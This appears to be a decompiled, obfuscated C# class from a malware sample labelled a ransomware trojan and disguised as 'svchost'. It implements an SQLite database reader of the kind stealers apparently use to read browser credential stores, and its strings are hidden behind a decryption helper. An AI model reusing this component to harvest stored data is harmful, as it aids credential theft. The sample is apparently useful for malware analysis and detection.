// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

public sealed class \u0003\u2003
{
  private byte[] \u0002;
  private ushort \u0003;
  private ulong \u0005;
  private \u0003\u2003.\u0005[] \u0008;
  private byte[] \u0006;
  private \u0003\u2003.\u0003[] \u000E;
  private string[] \u000F;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0003\u2003(string _param1)
  {
    this.\u0006 = new byte[10]
    {
      (byte) 0,
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 6,
      (byte) 8,
      (byte) 8,
      (byte) 0,
      (byte) 0
    };
    if (!File.Exists(_param1))
      return;
    FileSystem.FileOpen(1, _param1, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
    string s = Strings.Space(checked ((int) FileSystem.LOF(1)));
    FileSystem.FileGet(1, ref s);
    FileSystem.FileClose(1);
    this.\u0002 = Encoding.Default.GetBytes(s);
    this.\u0003 = checked ((ushort) this.\u0002(16, 2));
    this.\u0005 = this.\u0002(56, 4);
    if (Decimal.Compare(new Decimal(this.\u0005), 0M) == 0)
      this.\u0005 = 1UL;
    this.\u0002(100UL);
  }

  private int \u0002(int _param1)
  {
    if (_param1 > this.\u0002.Length)
      return 0;
    int num1 = _param1;
    int num2 = checked (_param1 + 8);
    int index = num1;
    while (index <= num2)
    {
      if (index > checked (this.\u0002.Length - 1))
        return 0;
      if (((int) this.\u0002[index] & 128) != 128)
        return index;
      checked { ++index; }
    }
    return checked (_param1 + 8);
  }

  private long \u0002(int _param1, int _param2)
  {
    checked { ++_param2; }
    byte[] numArray = new byte[8];
    int num1 = checked (_param2 - _param1);
    bool flag = false;
    if (num1 == 0 | num1 > 9)
      return 0;
    switch (num1)
    {
      case 1:
        numArray[0] = checked ((byte) ((int) this.\u0002[_param1] & (int) sbyte.MaxValue));
        return BitConverter.ToInt64(numArray, 0);
      case 9:
        flag = true;
        break;
    }
    int num2 = 1;
    int num3 = 7;
    int index1 = 0;
    if (flag)
    {
      numArray[0] = this.\u0002[checked (_param2 - 1)];
      checked { --_param2; }
      index1 = 1;
    }
    int num4 = checked (_param2 - 1);
    int num5 = _param1;
    int index2 = num4;
    while (index2 >= num5)
    {
      if (checked (index2 - 1) >= _param1)
      {
        numArray[index1] = checked ((byte) ((int) unchecked ((byte) ((uint) this.\u0002[index2] >> (checked (num2 - 1) & 7))) & (int) byte.MaxValue >> num2 | (int) unchecked ((byte) ((uint) this.\u0002[checked (index2 - 1)] << (num3 & 7)))));
        checked { ++num2; }
        checked { ++index1; }
        checked { --num3; }
      }
      else if (!flag)
        numArray[index1] = checked ((byte) ((int) unchecked ((byte) ((uint) this.\u0002[index2] >> (checked (num2 - 1) & 7))) & (int) byte.MaxValue >> num2));
      checked { index2 += -1; }
    }
    return BitConverter.ToInt64(numArray, 0);
  }

  private bool \u0002(long _param1) => (_param1 & 1L) == 1L;

  private ulong \u0002(int _param1, int _param2)
  {
    if (_param2 > 8 | _param2 == 0)
      return 0;
    ulong num1 = 0;
    int num2 = checked (_param2 - 1);
    int num3 = 0;
    while (num3 <= num2)
    {
      num1 = num1 << 8 | (ulong) this.\u0002[checked (_param1 + num3)];
      checked { ++num3; }
    }
    return num1;
  }

  private void \u0002(ulong _param1)
  {
    if (this.\u0002[checked ((int) _param1)] == (byte) 13)
    {
      ushort uint16 = Convert.ToUInt16(Decimal.Subtract(new Decimal(this.\u0002(Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2)), 1M));
      int num1 = 0;
      if (this.\u0008 != null)
      {
        num1 = this.\u0008.Length;
        this.\u0008 = (\u0003\u2003.\u0005[]) Utils.CopyArray((Array) this.\u0008, (Array) new \u0003\u2003.\u0005[checked (this.\u0008.Length + (int) uint16 + 1)]);
      }
      else
        this.\u0008 = new \u0003\u2003.\u0005[checked ((int) uint16 + 1)];
      int num2 = (int) uint16;
      int num3 = 0;
      while (num3 <= num2)
      {
        ulong num4 = this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 8M), new Decimal(checked (num3 * 2)))), 2);
        if (Decimal.Compare(new Decimal(_param1), 100M) != 0)
          checked { num4 += _param1; }
        int num5 = this.\u0002(checked ((int) num4));
        this.\u0002(checked ((int) num4), num5);
        int num6 = this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num5), new Decimal(num4))), 1M)));
        this.\u0008[checked (num1 + num3)].\u0002 = this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num5), new Decimal(num4))), 1M)), num6);
        ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num6), new Decimal(num4))), 1M));
        int num7 = this.\u0002(checked ((int) uint64));
        int num8 = num7;
        long num9 = this.\u0002(checked ((int) uint64), num7);
        long[] numArray = new long[5];
        int index = 0;
        do
        {
          int num10 = checked (num8 + 1);
          num8 = this.\u0002(num10);
          numArray[index] = this.\u0002(num10, num8);
          numArray[index] = numArray[index] <= 9L ? (long) this.\u0006[checked ((int) numArray[index])] : (!this.\u0002(numArray[index]) ? checked ((long) Math.Round(unchecked ((double) checked (numArray[index] - 12L) / 2.0))) : checked ((long) Math.Round(unchecked ((double) checked (numArray[index] - 13L) / 2.0))));
          checked { ++index; }
        }
        while (index <= 4);
        if (Decimal.Compare(new Decimal(this.\u0005), 1M) == 0)
          this.\u0008[checked (num1 + num3)].\u0003 = Encoding.Default.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num9))), checked ((int) numArray[0]));
        else if (Decimal.Compare(new Decimal(this.\u0005), 2M) == 0)
          this.\u0008[checked (num1 + num3)].\u0003 = Encoding.Unicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num9))), checked ((int) numArray[0]));
        else if (Decimal.Compare(new Decimal(this.\u0005), 3M) == 0)
          this.\u0008[checked (num1 + num3)].\u0003 = Encoding.BigEndianUnicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num9))), checked ((int) numArray[0]));
        if (Decimal.Compare(new Decimal(this.\u0005), 1M) == 0)
          this.\u0008[checked (num1 + num3)].\u0005 = Encoding.Default.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
        else if (Decimal.Compare(new Decimal(this.\u0005), 2M) == 0)
          this.\u0008[checked (num1 + num3)].\u0005 = Encoding.Unicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
        else if (Decimal.Compare(new Decimal(this.\u0005), 3M) == 0)
          this.\u0008[checked (num1 + num3)].\u0005 = Encoding.BigEndianUnicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
        this.\u0008[checked (num1 + num3)].\u0006 = checked ((long) this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2]))), (int) numArray[3]));
        if (Decimal.Compare(new Decimal(this.\u0005), 1M) == 0)
          this.\u0008[checked (num1 + num3)].\u000E = Encoding.Default.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
        else if (Decimal.Compare(new Decimal(this.\u0005), 2M) == 0)
          this.\u0008[checked (num1 + num3)].\u000E = Encoding.Unicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
        else if (Decimal.Compare(new Decimal(this.\u0005), 3M) == 0)
          this.\u0008[checked (num1 + num3)].\u000E = Encoding.BigEndianUnicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
        checked { ++num3; }
      }
    }
    else
    {
      if (this.\u0002[checked ((int) _param1)] != (byte) 5)
        return;
      int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(this.\u0002(Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2)), 1M));
      int num11 = 0;
      while (num11 <= uint16)
      {
        ushort num12 = checked ((ushort) this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 12M), new Decimal(num11 * 2))), 2));
        if (Decimal.Compare(new Decimal(_param1), 100M) == 0)
          this.\u0002(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.\u0002((int) num12, 4)), 1M), new Decimal((int) this.\u0003))));
        else
          this.\u0002(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.\u0002(checked ((int) (_param1 + (ulong) num12)), 4)), 1M), new Decimal((int) this.\u0003))));
        checked { ++num11; }
      }
      this.\u0002(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.\u0002(Convert.ToInt32(Decimal.Add(new Decimal(_param1), 8M)), 4)), 1M), new Decimal((int) this.\u0003))));
    }
  }

  private bool \u0002(ulong _param1)
  {
    if (this.\u0002[checked ((int) _param1)] == (byte) 13)
    {
      ushort uint16 = Convert.ToUInt16(Decimal.Subtract(new Decimal(this.\u0002(Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2)), 1M));
      int num1 = 0;
      if (this.\u000E != null)
      {
        num1 = this.\u000E.Length;
        this.\u000E = (\u0003\u2003.\u0003[]) Utils.CopyArray((Array) this.\u000E, (Array) new \u0003\u2003.\u0003[checked (this.\u000E.Length + (int) uint16 + 1)]);
      }
      else
        this.\u000E = new \u0003\u2003.\u0003[checked ((int) uint16 + 1)];
      int num2 = (int) uint16;
      int num3 = 0;
      while (num3 <= num2)
      {
        ulong num4 = this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 8M), new Decimal(checked (num3 * 2)))), 2);
        if (Decimal.Compare(new Decimal(_param1), 100M) != 0)
          checked { num4 += _param1; }
        int num5 = this.\u0002(checked ((int) num4));
        this.\u0002(checked ((int) num4), num5);
        int num6 = this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num5), new Decimal(num4))), 1M)));
        this.\u000E[checked (num1 + num3)].\u0002 = this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num5), new Decimal(num4))), 1M)), num6);
        ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(num4), Decimal.Subtract(new Decimal(num6), new Decimal(num4))), 1M));
        int num7 = this.\u0002(checked ((int) uint64));
        int num8 = num7;
        long num9 = this.\u0002(checked ((int) uint64), num7);
        long num10 = Convert.ToInt64(Decimal.Add(Decimal.Subtract(new Decimal(uint64), new Decimal(num7)), 1M));
        int index1 = 0;
        \u0003\u2003.\u0002[] arySrc;
        while (num10 < num9)
        {
          arySrc = (\u0003\u2003.\u0002[]) Utils.CopyArray((Array) arySrc, (Array) new \u0003\u2003.\u0002[checked (index1 + 1)]);
          int num11 = checked (num8 + 1);
          num8 = this.\u0002(num11);
          arySrc[index1].\u0003 = this.\u0002(num11, num8);
          arySrc[index1].\u0002 = arySrc[index1].\u0003 <= 9L ? (long) this.\u0006[checked ((int) arySrc[index1].\u0003)] : (!this.\u0002(arySrc[index1].\u0003) ? checked ((long) Math.Round(unchecked ((double) checked (arySrc[index1].\u0003 - 12L) / 2.0))) : checked ((long) Math.Round(unchecked ((double) checked (arySrc[index1].\u0003 - 13L) / 2.0))));
          num10 = checked (num10 + (long) (num8 - num11) + 1L);
          checked { ++index1; }
        }
        this.\u000E[checked (num1 + num3)].\u0003 = new string[checked (arySrc.Length - 1 + 1)];
        int num12 = 0;
        int num13 = checked (arySrc.Length - 1);
        int index2 = 0;
        while (index2 <= num13)
        {
          if (arySrc[index2].\u0003 > 9L)
          {
            if (!this.\u0002(arySrc[index2].\u0003))
            {
              if (Decimal.Compare(new Decimal(this.\u0005), 1M) == 0)
                this.\u000E[checked (num1 + num3)].\u0003[index2] = Encoding.Default.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(num12))), checked ((int) arySrc[index2].\u0002));
              else if (Decimal.Compare(new Decimal(this.\u0005), 2M) == 0)
                this.\u000E[checked (num1 + num3)].\u0003[index2] = Encoding.Unicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(num12))), checked ((int) arySrc[index2].\u0002));
              else if (Decimal.Compare(new Decimal(this.\u0005), 3M) == 0)
                this.\u000E[checked (num1 + num3)].\u0003[index2] = Encoding.BigEndianUnicode.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(num12))), checked ((int) arySrc[index2].\u0002));
            }
            else
              this.\u000E[checked (num1 + num3)].\u0003[index2] = Encoding.Default.GetString(this.\u0002, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(num12))), checked ((int) arySrc[index2].\u0002));
          }
          else
            this.\u000E[checked (num1 + num3)].\u0003[index2] = Conversions.ToString(this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num9)), new Decimal(num12))), checked ((int) arySrc[index2].\u0002)));
          num12 = checked ((int) ((long) num12 + arySrc[index2].\u0002));
          checked { ++index2; }
        }
        checked { ++num3; }
      }
    }
    else if (this.\u0002[checked ((int) _param1)] == (byte) 5)
    {
      int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(this.\u0002(Convert.ToInt32(Decimal.Add(new Decimal(_param1), 3M)), 2)), 1M));
      int num14 = 0;
      while (num14 <= uint16)
      {
        ushort num15 = checked ((ushort) this.\u0002(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(_param1), 12M), new Decimal(num14 * 2))), 2));
        this.\u0002(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.\u0002(checked ((int) (_param1 + (ulong) num15)), 4)), 1M), new Decimal((int) this.\u0003))));
        checked { ++num14; }
      }
      this.\u0002(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.\u0002(Convert.ToInt32(Decimal.Add(new Decimal(_param1), 8M)), 4)), 1M), new Decimal((int) this.\u0003))));
    }
    return true;
  }

  public bool \u0002(string _param1)
  {
    int index1 = -1;
    int length1 = this.\u0008.Length;
    int index2 = 0;
    while (index2 <= length1)
    {
      if (this.\u0008[index2].\u0005.ToLower().CompareTo(_param1.ToLower()) == 0)
      {
        index1 = index2;
        break;
      }
      checked { ++index2; }
    }
    if (index1 == -1)
      return false;
    string[] strArray = this.\u0008[index1].\u000E.Substring(checked (this.\u0008[index1].\u000E.IndexOf(\u0005\u2003.\u0002(1067761663)) + 1)).Split(',');
    int num = checked (strArray.Length - 1);
    int index3 = 0;
    while (index3 <= num)
    {
      strArray[index3] = Strings.LTrim(strArray[index3]);
      int length2 = strArray[index3].IndexOf(\u0005\u2003.\u0002(1067754868));
      if (length2 > 0)
        strArray[index3] = strArray[index3].Substring(0, length2);
      if (strArray[index3].IndexOf(\u0005\u2003.\u0002(1067761655)) != 0)
      {
        this.\u000F = (string[]) Utils.CopyArray((Array) this.\u000F, (Array) new string[checked (index3 + 1)]);
        this.\u000F[index3] = strArray[index3];
        checked { ++index3; }
      }
      else
        break;
    }
    return this.\u0002(checked ((ulong) ((this.\u0008[index1].\u0006 - 1L) * (long) this.\u0003)));
  }

  public int \u0002() => this.\u000E.Length;

  public string \u0002(int _param1, int _param2) => _param1 >= this.\u000E.Length || _param2 >= this.\u000E[_param1].\u0003.Length ? (string) null : this.\u000E[_param1].\u0003[_param2];

  public string \u0002(int _param1, string _param2)
  {
    int num = -1;
    int length = this.\u000F.Length;
    int index = 0;
    while (index <= length)
    {
      if (this.\u000F[index].ToLower().CompareTo(_param2.ToLower()) == 0)
      {
        num = index;
        break;
      }
      checked { ++index; }
    }
    return num == -1 ? (string) null : this.\u0002(_param1, num);
  }

  public string[] \u0002()
  {
    int index1 = 0;
    int num = checked (this.\u0008.Length - 1);
    int index2 = 0;
    string[] arySrc;
    while (index2 <= num)
    {
      if (Operators.CompareString(this.\u0008[index2].\u0003, \u0005\u2003.\u0002(1067761610), false) == 0)
      {
        arySrc = (string[]) Utils.CopyArray((Array) arySrc, (Array) new string[checked (index1 + 1)]);
        arySrc[index1] = this.\u0008[index2].\u0005;
        checked { ++index1; }
      }
      checked { ++index2; }
    }
    return arySrc;
  }

  private struct \u0002
  {
    public long \u0002;
    public long \u0003;
  }

  private struct \u0003
  {
    public long \u0002;
    public string[] \u0003;
  }

  private struct \u0005
  {
    public long \u0002;
    public string \u0003;
    public string \u0005;
    public string \u0008;
    public long \u0006;
    public string \u000E;
  }
}
